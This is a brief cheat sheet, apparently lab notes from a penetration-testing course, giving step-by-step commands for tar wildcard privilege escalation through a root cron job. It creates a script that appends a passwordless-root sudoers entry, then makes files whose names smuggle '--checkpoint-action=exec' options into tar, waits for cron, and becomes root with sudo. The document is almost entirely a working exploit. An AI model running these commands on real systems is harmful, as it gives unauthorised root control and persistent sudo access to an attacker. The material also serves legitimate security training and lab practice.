# Wildcard Abuse

## tar Wildcard Privilege Escalation (cron-based)

### 1. Create malicious payload files

```sh
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

### 2. Verify payload

```sh
ls -la
```

### 3. Wait for the cron job running something like:

```
tar -cf /backup/*.tar *
```

(You can monitor)

```sh
tail -f /var/log/syslog
```

### 4. After cron executes - verify sudo escalation

```sh
sudo -l
```

### 5. Become root

```sh
sudo su
```
